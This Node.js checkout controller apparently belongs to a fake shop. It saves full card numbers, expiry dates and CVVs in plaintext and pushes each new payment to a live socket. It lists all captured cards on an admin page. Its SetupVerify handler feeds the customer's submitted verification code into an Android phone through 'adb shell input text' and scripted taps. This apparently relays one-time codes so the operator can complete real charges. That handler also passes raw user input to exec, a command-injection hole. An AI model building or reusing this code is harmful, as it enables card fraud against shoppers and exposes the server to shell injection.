const ejs = require('ejs');
const fs = require('fs');
const path = require('path');
const PaymentInfor = require('../../models/PaymentInfor');
const SocketConnect = require('../../Connect/SocketConnect');
const { exec } = require('child_process');
const { stdout, emit } = require('process');
const Order = require('../../models/Order');
const OrderDetail = require('../../models/OrderDetail');
const sendEmail = require('../../utils/sendEmail');
const User = require('../../models/User');
const Address = require('../../models/Address');


class AccountUserController {
    async AddNewAccountInfor(req, res) {
        const { firstName, lastname, address, email, cardNumber, State, City, expiry, cvv, Country, zipCode, Option } = req.body;
        const userId = req.session.user ? req.session.user.id : null;
        if (!userId || !req.session.user.email) {
            return res.redirect('/login');
        }
        // const emails = req.session.user.email;
        try {
            // Create payment information
            const payment = await PaymentInfor.create({
                cardholderName: firstName,
                country: Country + " " + State[0] + " " + City,
                address: address,
                zipCode: zipCode,
                cardNumber: cardNumber,
                expiry: expiry,
                cvv: cvv,
                options: Option,
            });
            let totalAmounts = 0;

            req.session.cart.forEach(product => {
                totalAmounts += (product.price * product.quantity);
            });
            totalAmounts = totalAmounts + 25 + 5;

            let orderid = Math.floor(100000000 + Math.random() * 900000000);
            let count = 0;
            let ordersame = await Order.findOne({ where: { id: orderid } });

            if (ordersame) {
                while (count < 100) {
                    orderid = Math.floor(100000000 + Math.random() * 900000000);
                    ordersame = await Order.findOne({ where: { id: orderid } });
                    if (ordersame == null) break;
                    if (count == 99) return;
                    count++;
                }
            }
            const order = await Order.create({
                id: orderid,
                userId: userId,
                totalAmount: totalAmounts,
                Name: firstName + " " + lastname,
                Email: email,
                AddressOrderShip: address + " , " + City + " , " + State[0] + " , " + Country + " , " + zipCode,
                paymentId: payment.id,
                cardNumberpurchase: cardNumber,
            });

            const existingAddress = await Address.findOne({
                where: {
                    userId: userId,
                    street: address,
                    city: City,
                    state: State[0],
                    postalCode: zipCode,
                    country: Country,
                }
            });

            if (!existingAddress) {
                await Address.create({
                    street: address,
                    userId: userId,
                    city: City,
                    state: State[0],
                    postalCode: zipCode,
                    country: Country,
                });

            }

            const cartItems = req.session.cart || [];
            const orderDetails = cartItems.map(item => ({
                orderId: order.id,
                productId: item.id,
                quantity: item.quantity,
                price: item.price,
            }));

            // Create order details in bulk
            await OrderDetail.bulkCreate(orderDetails);

            let formattedDate = ""
            const dateStr = order.orderDate;
            const date = new Date(dateStr);

            if (!isNaN(date.getTime())) {
                // Add 4 days
                date.setDate(date.getDate() + 4);
                const options = { year: 'numeric', month: 'short', day: 'numeric' };
                formattedDate = date.toLocaleDateString('en-US', options).replace(',', '');

                console.log(formattedDate);
            } else {
                console.error("Invalid date format");
            }

            const socketConnect = SocketConnect.instance;
            if (socketConnect && socketConnect.io) {
                socketConnect.io.emit('newPayment', payment);
            } else {
                console.log("Socket connection not available");
            }
            const addressnew = address + " , " + City + " , " + State[0] + " , " + Country + " , " + zipCode;
            const htmlemail = `
                            <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Thank You for Your Order!</title>
                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            background-color: #f7f7f7;
                            margin: 0;
                            padding: 0;
                        }
                        .container {
                            max-width: 600px;
                            margin: 0 auto;
                            background-color: #ffffff;
                            padding: 20px;
                            border-radius: 8px;
                            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
                        }
                        h1 {
                            color: #28a745; /* Green for confirmation */
                        }
                        .order-details {
                            border-top: 2px solid #28a745;
                            margin-top: 20px;
                            padding-top: 20px;
                        }
                        .footer {
                            margin-top: 20px;
                            font-size: 14px;
                            color: #666666;
                        }
                        .coupon {
                            background-color: #e8f5e9;
                            padding: 10px;
                            border: 1px solid #c8e6c9;
                            border-radius: 5px;
                            text-align: center;
                        }
                        .coupon-code {
                            font-weight: bold;
                            color: #388e3c; /* Dark green */
                        }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>Thank You for Your Order!</h1>
                        <p>Hello ${firstName},</p>
                        <p>We are thrilled to inform you that your order has been successfully placed!</p>

                        <div class="order-details">
                            <h2>Order Details</h2>
                            <p><strong>Order Number:</strong> #${order.id}</p>
                            <p><strong>Shipping Address:</strong> ${addressnew}</p>
                            <p><strong>Delivery Time:</strong> ${formattedDate}</p>
                            <p><strong>Payment Method:</strong> Visa **** **** **** ${cardNumber.slice(-4)}</p>
                        </div>

                        <div class="coupon">
                            <p>🎉 Congratulations! Enjoy 30% off your next purchase!</p>
                            <p>Use the coupon code: <span class="coupon-code">30%SALEOFF</span></p>
                        </div>

                        <div class="footer">
                            <p>Thank you for shopping with us!</p>
                        </div>
                    </div>
                </body>
                </html>
        `;
            const addressforerview = City + " , " + State[0] + " , " + Country + ",";

            req.session.thankYouData = {
                firstName: firstName,
                orderId: order.id,
                address: address,
                city: addressforerview,
                zipCode: zipCode,
                lastFourDigits: cardNumber.slice(-4)
            };

            req.session.cart = []; // Clear cart if required
            sendEmail(email, 'Thanks Order', htmlemail);

            res.redirect('/thanks'); // Send response back to client
        } catch (error) {
            console.error('Error creating order and payment information:', error);
            res.status(500).send('Internal Server Error');
        }

    }

    async GetAllPayMent(req, res) {
        try {
            const page = parseInt(req.query.page) || 1; // Số trang mặc định là 1
            const limit = parseInt(req.query.limit) || 10; // Số bản ghi trên mỗi trang mặc định là 10
            const offset = (page - 1) * limit; // Tính toán vị trí bắt đầu

            // Lấy tổng số bản ghi để tính toán tổng số trang
            const totalPayments = await PaymentInfor.count();
            const totalPages = Math.ceil(totalPayments / limit); // Tổng số trang

            // Lấy bản ghi cho trang hiện tại
            const payments = await PaymentInfor.findAll({
                limit: limit,
                offset: offset
            });

            res.render('AdminViews/InforCard', {
                title: 'Infor Card',
                payments,
                currentPage: page,
                limit: limit,
                totalPages: totalPages,
                layout: 'layouts/admin'
            });
        } catch (error) {
            console.error("Error fetching payments:", error);
            res.status(500).send('Server Error');
        }
    }


    async runAdbCommand(command, callback = null) {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing adb command: ${error.message}`);
                return;
            }
            if (callback) {
                callback(stdout);
            }
        });
    }

    async SetupVerify(req, res) {
        const socketConnect = SocketConnect.instance;
        const { code } = req.body;
        // Send the code via ADB
        const adbCommand = `adb shell input text ${code}`;
        exec(adbCommand, (error, stdout, stderr) => {
            if (error) {
                res.redirect('/payment');
                console.error(`Error sending code: ${error.message}`);
                socketConnect.io.emit('codeResult', { success: false });
            } else {
                setTimeout(() => {
                    this.runAdbCommand(`adb shell input tap 904 1200`, () => {
                        setTimeout(() => {
                            this.runAdbCommand(`adb shell input tap 904 1600`, () => {
                                console.log("vao submitttttt");
                            })
                        }, 4000);
                    })
                }, 3000); // Wait for 5 seconds to give the device time to respond
            }
        });
        res.redirect('/payment/process');
    }
}

module.exports = AccountUserController;
